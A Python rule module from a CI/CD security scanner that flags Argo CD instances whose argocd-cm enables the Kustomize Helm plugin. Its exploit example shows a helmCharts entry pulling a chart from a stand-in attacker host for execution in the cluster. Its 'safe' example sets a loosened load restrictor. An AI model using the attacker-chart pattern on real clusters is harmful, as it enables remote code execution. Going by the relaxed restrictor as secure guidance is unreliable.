"""ARGOCD-015. argocd-cm kustomize.buildOptions enables the Helm plugin."""
from __future__ import annotations

from ...base import Finding, Severity
from ...rule import Rule
from ..base import ArgoCDContext, argocd_cm

RULE = Rule(
    id="ARGOCD-015",
    title="Argo CD Kustomize build options enable the Helm plugin",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4",),
    esf=("ESF-S-PIPELINE-INTEGRITY",),
    cwe=("CWE-94", "CWE-829"),
    recommendation=(
        "Remove ``--enable-helm`` from ``kustomize.buildOptions`` in "
        "``argocd-cm``. The flag is global: once set, every Kustomize "
        "Application on the instance can inflate Helm charts at build "
        "time, fetching and rendering remote charts instead of "
        "staying a plain set of manifests. If a chart is required, "
        "model it as a Helm source on the specific Application so it "
        "goes through the normal source review (ARGOCD-007 / "
        "ARGOCD-010)."
    ),
    docs_note=(
        "Reads ``data.kustomize.buildOptions`` on the ``argocd-cm`` "
        "ConfigMap and fires when the value contains the "
        "``--enable-helm`` token. ``kustomize build --enable-helm`` "
        "lets a ``kustomization.yaml`` declare ``helmCharts`` that "
        "Kustomize fetches and templates, turning a Kustomize app "
        "into a remote chart fetch-and-execute path."
    ),
    known_fp=(
        "Some teams legitimately inflate trusted in-repo charts "
        "through Kustomize and accept the global flag. The rule "
        "still fires; confirm every Kustomize app's chart sources "
        "are pinned and trusted, then suppress with a rationale.",
    ),
    exploit_example=(
        "# Vulnerable: the global build option turns on the Helm\n"
        "# plugin for every Kustomize Application on the instance.\n"
        "apiVersion: v1\n"
        "kind: ConfigMap\n"
        "metadata: { name: argocd-cm, namespace: argocd }\n"
        "data:\n"
        "  kustomize.buildOptions: \"--enable-helm\"\n"
        "\n"
        "# Attack: an attacker who can edit a kustomization.yaml\n"
        "# adds a helmCharts entry pointing repo at a chart they\n"
        "# control. Argo CD's repo-server fetches and renders it,\n"
        "# executing the chart's templates (and any\n"
        "# post-renderer / lookup) against the cluster.\n"
        "#   helmCharts:\n"
        "#     - name: payload\n"
        "#       repo: https://attacker.example/charts\n"
        "#       version: 0.1.0\n"
        "\n"
        "# Safe: drop the flag; model trusted charts as Helm sources.\n"
        "data:\n"
        "  kustomize.buildOptions: \"--load-restrictor LoadRestrictionsNone\""
    ),
)


_ENABLE_HELM = "--enable-helm"


def check(ctx: ArgoCDContext) -> Finding:
    cm = argocd_cm(ctx)
    if cm is None:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource="argocd",
            description="No argocd-cm ConfigMap to check.",
            recommendation="No action required.", passed=True,
        )
    data = cm.data.get("data") or {}
    if not isinstance(data, dict):
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource="argocd",
            description="argocd-cm has no data map.",
            recommendation="No action required.", passed=True,
        )
    build_options = data.get("kustomize.buildOptions")
    if isinstance(build_options, str) and _ENABLE_HELM in build_options.split():
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource="argocd",
            description=(
                "argocd-cm sets kustomize.buildOptions with "
                "--enable-helm, so every Kustomize app can fetch and "
                "inflate remote Helm charts."
            ),
            recommendation=RULE.recommendation, passed=False,
        )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource="argocd",
        description="Kustomize build options do not enable the Helm plugin.",
        recommendation=RULE.recommendation, passed=True,
    )
